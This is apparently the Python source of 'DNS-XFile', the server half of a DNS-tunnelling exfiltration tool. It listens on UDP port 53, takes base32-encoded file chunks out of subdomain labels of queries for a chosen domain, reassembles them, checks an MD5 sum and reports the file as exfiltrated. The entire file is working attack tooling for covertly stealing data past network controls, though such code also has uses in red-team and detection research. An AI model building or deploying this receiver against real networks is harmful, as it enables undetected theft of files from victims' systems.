#!/usr/bin/env python3.12

from curses.ascii import isdigit
import sys
import signal
import argparse
import socket
import dnslib
import base64
from dpkt import dns
from utils import *

def fromBase32(msg):
	# Base32 decoding, we need to add the padding back
	# Add padding characters
	mod = len(msg) % 8
	if mod == 2:
		padding = "======"
	elif mod == 4:
		padding = "===="
	elif mod == 5:
		padding = "==="
	elif mod == 7:
		padding = "="
	else:
		padding = ""

	return base64.b32decode(msg.upper() + padding)

class FileReconstructor:
    def __init__(self, args):
        self.address, self.port = args.socket.split(':')
        self.domain = args.domain
        self.files = {}

        # Setup a UDP server listening on port UDP 53
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        IP = "0.0.0.0"
        PORT = 53
        self.sock.bind((IP, PORT))

        while True:
            try:
                data, address = self.sock.recvfrom(65536)
                query = dnslib.DNSRecord.parse(data)
                #print(query)
                #print('test')
                
                self.dns_query_handler(query, address)                

            except dnslib.DNSError as e:
                print(f"DNSLib error: {e}")
                #self.sock.close()
                continue
            except Exception as e:
                print(f"An error occurred: {e}")
                break
    
    def dns_query_handler(self, query, address):

        for q in query.questions:

            if self.domain in str(q.qname):
            
                # Check if it is the initialization request (NFXGS5A = base32(INIT))
                if ".NFXGS5A." in str(q.qname).upper():
                    qname_parts = str(q.qname).split(".")
                    print(qname_parts)

                    sessionid = qname_parts[0]
                    
                    filename = fromBase32(qname_parts[2]).decode('utf-8') # Name of the file being exfiltrated
                    #filename = filename
                    print('message:' + filename)
            
                    #nb_chunks = fromBase32(qname_parts[3]).decode('utf-8') # Total number of chunks of data expected to receive
                    #nb_chunks = nb_chunks.decode('utf-8')
                    #print('nbChunks:' + nb_chunks)

                    checksum = fromBase32(qname_parts[3]).decode('utf-8') # Checksum of the file to receive
                    #checksum = checksum.decode('utf-8')
                    print('checksum:' + checksum)


                    if sessionid not in self.files:
                        self.files[sessionid] = {
                            'checksum': checksum,
                            'filename': filename,
                            'packets_order': [],
                            'data': [],
                            'total_chunks': -1
                        }
                        print(f"Created a buffer for file {filename} with checksum {checksum}")
                    
                    
                    reply = dnslib.DNSRecord(dnslib.DNSHeader(id=query.header.id, qr=1, aa=1, ra=1), q=query.q) 
                    reply.add_answer(dnslib.RR(query.q.qname, dnslib.QTYPE.TXT, rdata=dnslib.TXT(""), ttl=60))

                    #reply.add_answer(dnslib.RR(query.q.qname, dnslib.QTYPE.TXT, rdata=dnslib.TXT("OK")))
                    self.sock.sendto(reply.pack(), address)

                elif ".MVXGI." in str(q.qname).upper():

                    qname_parts = str(q.qname).split(".")
                    print(qname_parts)

                    sessionid = qname_parts[0]
                    filename = self.files[sessionid]['filename']
                    self.files[sessionid]['total_chunks'] = int(qname_parts[1]) # chunk which represent the total of chunks sent

                    #print(type(self.files[sessionid]['total_chunks']))
                    #print(type(len(self.files[sessionid]['data'])))
                    #print(self.files[sessionid]['total_chunks'] == len(self.files[sessionid]['data']))

                    if self.files[sessionid]['total_chunks'] == len(self.files[sessionid]['data']):

                        reply = dnslib.DNSRecord(dnslib.DNSHeader(id=query.header.id, qr=1, aa=1, ra=1), q=query.q)
                        reply.add_answer(dnslib.RR(query.q.qname, dnslib.QTYPE.TXT, rdata=dnslib.TXT("done"), ttl=60))
                        self.sock.sendto(reply.pack(), address)

                        #print(self.files[sessionid]['packets_order'])

                        #for packet_order, datat in zip(self.files[sessionid]['packets_order'], self.files[sessionid]['data']):
    
                        #    print("Packet Order:", packet_order)
                        #    print("Data:", datat)
                        
                         
                        #self.files[sessionid]['packets_order'], self.files[sessionid]['data'] = \
                        #    [list(x) for x in zip(*sorted(zip(self.files[sessionid]['packets_order'], self.files[sessionid]['data'])))]
                        
                        content = ''.join(str(v) for v in self.files[sessionid]['data'])
                        #print('content:')
                        #print(content)
                        decoded_content = decode_base32(content)                        

                        try:
                            with open(filename, 'wb') as f:
                                f.write(decoded_content)
                        except IOError as e:
                            print("Got %s: cannot save file %s" % filename)
                            raise e
                        
                        if (self.files[sessionid]['checksum'] == md5(open(filename, 'rb'))):
                            print("Exfiltrated file %s recovered" % (filename))
                        else:
                            print("Exfiltrated file %s is corrupted!" % (filename))

                        del self.files[sessionid]
                        
                        
                    else:
                        print("Received the last packet, but some are missing.")

                    print("It is the end")

                else:
                    qname_parts = str(q.qname).split(".")
                    print(qname_parts)

                    sessionid = qname_parts[0]
                    chunk = qname_parts[1]

                    data = ''.join(qname_parts[2:-3])
                    print(data)

                    
                    if sessionid in self.files and chunk not in self.files[sessionid]['packets_order']:
                        self.files[sessionid]['data'].append(data)
                        self.files[sessionid]['packets_order'].append(chunk)
                    
                    reply = dnslib.DNSRecord(dnslib.DNSHeader(id=query.header.id, qr=1, aa=1, ra=1), q=query.q)
                    reply.add_answer(dnslib.RR(query.q.qname, dnslib.QTYPE.TXT, rdata=dnslib.TXT(chunk), ttl=60))
                    self.sock.sendto(reply.pack(), address)


def signal_handler(sig, frame):
    print("Received signal {}, exiting...".format(sig))
    sys.exit(0)

def main():

    parser = argparse.ArgumentParser(description='DNS-XFile (LoicCaudron)')
    parser.add_argument('-s', '--socket', action="store", dest="socket", default='0.0.0.0:53',
                        help="The upstream server for making DNS requests and the port (eg. '-s 127.0.0.1:53')")
    parser.add_argument('-d', '--domain', action="store", dest="domain",
                        help="The domain to make requests for. (eg. '-d test.com')")
    args = parser.parse_args()

    # Afficher les valeurs des arguments
    print('Socket:', args.socket)
    print('Domains:', args.domain, '\n')

    signal.signal(signal.SIGINT, signal_handler)

    test = FileReconstructor(args)

    


if __name__ == '__main__':
    main()